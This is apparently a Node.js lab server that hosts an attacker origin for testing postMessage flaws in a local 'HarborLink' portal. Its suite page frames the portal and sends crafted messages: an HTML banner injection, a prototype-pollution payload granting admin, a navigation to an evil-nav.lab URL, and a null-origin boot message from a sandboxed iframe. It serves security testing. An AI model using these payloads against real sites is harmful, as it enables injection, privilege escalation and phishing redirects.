/**
 * Foreign origin for HarborLink postMessage attacks.
 */
const http = require('http');

const PORT = Number(process.env.PORT || 3899);

function page(title, body) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>${title}</title>
  <style>
    body { font-family: Georgia, serif; max-width: 880px; margin: 1.5rem auto; background: #1c1008; color: #ffedd5; line-height: 1.45; }
    a { color: #fdba74; }
    code, pre { font-family: Consolas, monospace; }
    iframe { width: 100%; min-height: 8rem; border: 1px solid #7c2d12; background: #fff; }
    #out { background: #111; color: #fed7aa; padding: 0.7rem 0.8rem; min-height: 6rem; white-space: pre-wrap; }
  </style>
</head>
<body>
  <p><a href="/">Attacker :${PORT}</a></p>
  ${body}
</body>
</html>`;
}

const server = http.createServer((req, res) => {
  const path = (req.url || '/').split('?')[0];
  if (path === '/health') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('ok');
    return;
  }

  let html = '';
  if (path === '/' || path === '/index.html') {
    html = page(
      'postMessage attacker',
      `
      <h1>Evil origin</h1>
      <p>This site is <code>http://127.0.0.1:${PORT}</code>. It can
      <code>postMessage</code> into HarborLink if the portal does not pin
      <code>event.origin</code>.</p>
      <p><a href="/suite?target=http://127.0.0.1:3800/portal">Open attack suite</a></p>
    `
    );
  } else if (path === '/suite') {
    html = page(
      'postMessage suite',
      `
      <h1>Real postMessage suite</h1>
      <p>Embeds the portal and sends banner / hello / cfg / go. Null-origin
      boot is sent from a sandboxed child.</p>
      <iframe id="portal"></iframe>
      <iframe id="nullchild" sandbox="allow-scripts" src="/null-child"></iframe>
      <pre id="out">idle</pre>
      <script>
        const params = new URLSearchParams(location.search);
        const target = params.get('target') || 'http://127.0.0.1:3800/portal';
        const out = document.getElementById('out');
        function log(s) { out.textContent += (typeof s === 'string' ? s : JSON.stringify(s)) + '\\n'; }
        window.addEventListener('message', function (ev) {
          log('recv origin=' + ev.origin + ' ' + JSON.stringify(ev.data));
        });
        const portal = document.getElementById('portal');
        portal.src = target;
        portal.onload = function () {
          const w = portal.contentWindow;
          w.postMessage({ op: 'banner', html: '<b>attacker banner</b>' }, '*');
          w.postMessage({ op: 'hello' }, '*');
          w.postMessage({ op: 'cfg', json: '{"__proto__":{"admin":true}}' }, '*');
          w.postMessage({ op: 'go', url: 'https://evil-nav.lab/pm-open-url' }, '*');
          log('sent banner/hello/cfg/go to ' + target);
        };
      </script>
    `
    );
  } else if (path === '/null-child') {
    html = `<!DOCTYPE html><html><body style="background:#111;color:#fed7aa;font-family:monospace">
<pre id="o">null child origin should be null</pre>
<script>
  document.getElementById('o').textContent += '\\ndocument.origin=' + document.origin;
  try {
    if (parent && parent.frames && parent.frames[0]) {
      parent.frames[0].postMessage({ op: 'boot' }, '*');
      document.getElementById('o').textContent += '\\nsent boot';
    }
  } catch (e) {
    document.getElementById('o').textContent += '\\n' + e;
  }
</script>
</body></html>`;
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('not found');
    return;
  }
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(html);
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[attacker] postMessage pages on ${PORT}`);
});
